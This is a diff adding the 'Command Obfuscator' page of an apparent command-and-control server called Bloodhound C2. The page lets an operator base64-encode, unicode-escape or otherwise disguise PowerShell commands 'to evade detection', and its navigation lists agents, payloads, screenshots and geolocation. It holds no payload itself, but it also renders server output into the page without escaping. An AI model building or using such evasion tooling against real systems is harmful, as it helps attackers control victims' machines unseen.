@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Obfuscator - Bloodhound C2</title>
+    <link rel="stylesheet" href="/static/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- Mobile Menu Toggle -->
+    <button class="mobile-menu-toggle" onclick="toggleSidebar()">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <!-- Sidebar Navigation -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h1>Bloodhound C2</h1>
+            <div class="subtitle">Command & Control Server</div>
+        </div>
+        
+        <nav class="sidebar-nav">
+            <a href="/" class="nav-item">
+                <i class="fas fa-tachometer-alt"></i>
+                Dashboard
+            </a>
+            <a href="/agents" class="nav-item">
+                <i class="fas fa-server"></i>
+                Agents
+            </a>
+            <a href="/payloads" class="nav-item">
+                <i class="fas fa-rocket"></i>
+                Payloads
+            </a>
+            <a href="/screenshots" class="nav-item">
+                <i class="fas fa-camera"></i>
+                Screenshots
+            </a>
+            <a href="/obfuscator" class="nav-item active">
+                <i class="fas fa-code"></i>
+                <span>Command Obfuscator</span>
+            </a>
+            <a href="/scheduler" class="nav-item">
+                <i class="fas fa-clock"></i>
+                Task Scheduler
+            </a>
+            <a href="/geolocation" class="nav-item">
+                <i class="fas fa-map-marker-alt"></i>
+                Geolocation
+            </a>
+            <a href="/files" class="nav-item">
+                <i class="fas fa-file-upload"></i>
+                File Management
+            </a>
+            
+            <!-- Theme Toggle Button -->
+            <div class="theme-toggle-container" style="padding: 20px; text-align: center; border-top: 1px solid var(--border-color);">
+                <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()">
+                    <i class="fas fa-sun" id="themeIcon"></i>
+                </button>
+            </div>
+        </nav>
+    </div>
+
+    <!-- Main Content Area -->
+    <div class="main-content">
+        <div class="page-header fade-in">
+            <h2>Command Obfuscator</h2>
+            <p class="description">Obfuscate PowerShell commands to evade detection</p>
+        </div>
+
+        <div class="grid grid-2">
+            <div class="card fade-in">
+                <div class="card-header">
+                    <div>
+                        <div class="card-title">Input Command</div>
+                        <div class="card-subtitle">Enter your PowerShell command</div>
+                    </div>
+                </div>
+                <div class="card-content">
+                    <textarea id="inputCommand" placeholder="Enter PowerShell command here..." rows="8" class="form-control"></textarea>
+                    
+                    <div class="form-group" style="margin-top: 20px;">
+                        <label for="obfuscationTechnique">Obfuscation Technique:</label>
+                        <select id="obfuscationTechnique" class="form-control">
+                            <option value="none">No Obfuscation</option>
+                            <option value="base64">Base64 Encoding</option>
+                            <option value="string_manipulation">String Manipulation</option>
+                            <option value="unicode_escape">Unicode Escape</option>
+                            <option value="variable_substitution">Variable Substitution</option>
+                            <option value="reverse_string">Reverse String</option>
+                        </select>
+                    </div>
+                    
+                    <button class="btn btn-primary" onclick="obfuscateCommand()" style="margin-top: 20px;">
+                        <i class="fas fa-mask"></i> Obfuscate Command
+                    </button>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <div class="card-header">
+                    <div>
+                        <div class="card-title">Obfuscated Output</div>
+                        <div class="card-subtitle">Your obfuscated command</div>
+                    </div>
+                    <button class="btn btn-secondary btn-sm" onclick="copyToClipboard()">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+                <div class="card-content">
+                    <div id="obfuscatedOutput" class="code-output">
+                        <div style="text-align: center; padding: 40px; color: var(--text-secondary);">
+                            <i class="fas fa-code" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
+                            <p>Obfuscated command will appear here</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card fade-in" style="margin-top: 30px;">
+            <div class="card-header">
+                <div>
+                    <div class="card-title">Obfuscation Techniques</div>
+                    <div class="card-subtitle">Available obfuscation methods</div>
+                </div>
+            </div>
+            <div class="card-content">
+                <div id="techniquesList" class="grid grid-3">
+                    <!-- Techniques will be loaded here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Obfuscate command
+        function obfuscateCommand() {
+            const command = document.getElementById('inputCommand').value.trim();
+            const technique = document.getElementById('obfuscationTechnique').value;
+            
+            if (!command) {
+                alert('Please enter a command to obfuscate');
+                return;
+            }
+            
+            fetch('/api/obfuscate', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    command: command,
+                    technique: technique
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.error) {
+                    alert('Error: ' + data.error);
+                    return;
+                }
+                
+                const output = document.getElementById('obfuscatedOutput');
+                output.innerHTML = `
+                    <div class="obfuscation-result">
+                        <div class="result-section">
+                            <h4>Original Command:</h4>
+                            <pre class="code-block">${data.original}</pre>
+                        </div>
+                        <div class="result-section">
+                            <h4>Obfuscated Command:</h4>
+                            <pre class="code-block">${data.obfuscated}</pre>
+                        </div>
+                        <div class="result-section">
+                            <h4>Technique Used:</h4>
+                            <span class="technique-badge">${data.technique}</span>
+                        </div>
+                    </div>
+                `;
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to obfuscate command');
+            });
+        }
+
+        // Copy to clipboard
+        function copyToClipboard() {
+            const output = document.getElementById('obfuscatedOutput');
+            const codeBlock = output.querySelector('.code-block');
+            
+            if (codeBlock) {
+                navigator.clipboard.writeText(codeBlock.textContent).then(() => {
+                    // Show success message
+                    const btn = document.querySelector('.btn-secondary');
+                    const originalText = btn.innerHTML;
+                    btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                    btn.classList.add('btn-success');
+                    
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                        btn.classList.remove('btn-success');
+                    }, 2000);
+                }).catch(() => {
+                    alert('Failed to copy to clipboard');
+                });
+            }
+        }
+
+        // Toggle sidebar on mobile
+        function toggleSidebar() {
+            const sidebar = document.querySelector('.sidebar');
+            sidebar.classList.toggle('collapsed');
+        }
+
+        // Highlight current page in navigation
+        function highlightCurrentPage() {
+            const currentPath = window.location.pathname;
+            const navItems = document.querySelectorAll('.nav-item');
+            
+            navItems.forEach(item => {
+                item.classList.remove('active');
+                if (item.getAttribute('href') === currentPath) {
+                    item.classList.add('active');
+                }
+            });
+        }
+
+        // Load obfuscation techniques
+        function loadTechniques() {
+            fetch('/api/obfuscation-techniques')
+                .then(response => response.json())
+                .then(techniques => {
+                    const container = document.getElementById('techniquesList');
+                    container.innerHTML = techniques.map(tech => `
+                        <div class="technique-card">
+                            <div class="technique-icon">
+                                <i class="fas fa-${tech.id === 'none' ? 'code' : 'shield-alt'}"></i>
+                            </div>
+                            <div class="technique-name">${tech.name}</div>
+                            <div class="technique-description">${tech.description}</div>
+                        </div>
+                    `).join('');
+                })
+                .catch(error => {
+                    console.error('Error loading techniques:', error);
+                });
+        }
+
+        // Theme Management
+        function initTheme() {
+            const savedTheme = localStorage.getItem('theme') || 'dark';
+            setTheme(savedTheme);
+        }
+
+        function toggleTheme() {
+            const currentTheme = document.documentElement.getAttribute('data-theme');
+            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
+            setTheme(newTheme);
+        }
+
+        function setTheme(theme) {
+            document.documentElement.setAttribute('data-theme', theme);
+            localStorage.setItem('theme', theme);
+            
+            const themeIcon = document.getElementById('themeIcon');
+            if (theme === 'light') {
+                themeIcon.className = 'fas fa-moon';
+                themeIcon.style.color = '#333';
+            } else {
+                themeIcon.className = 'fas fa-sun';
+                themeIcon.style.color = '#ffd700';
+            }
+        }
+
+        // Load techniques on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            initTheme(); // Initialize theme first
+            loadTechniques();
+            highlightCurrentPage(); // Call highlightCurrentPage on page load
+        });
+    </script>
+</body>
+</html>
